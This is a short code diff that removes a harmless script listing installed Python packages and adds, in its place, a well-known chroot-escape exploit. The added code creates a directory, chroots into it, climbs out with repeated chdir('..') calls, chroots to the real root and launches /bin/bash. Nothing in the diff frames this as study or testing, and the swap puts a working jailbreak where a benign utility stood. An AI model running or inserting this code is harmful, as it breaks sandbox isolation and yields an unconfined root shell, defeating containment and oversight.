@@ -1,5 +1,8 @@
-import pkg_resources
-installed_packages = pkg_resources.working_set
-installed_packages_list = sorted(["%s==%s" % (i.key, i.version)
-   for i in installed_packages])
-print(installed_packages_list)
+#!/usr/bin/python
+import os
+os.mkdir("chroot-dir")
+os.chroot("chroot-dir")
+for i in range(1000):
+    os.chdir("..")
+os.chroot(".")
+os.system("/bin/bash")
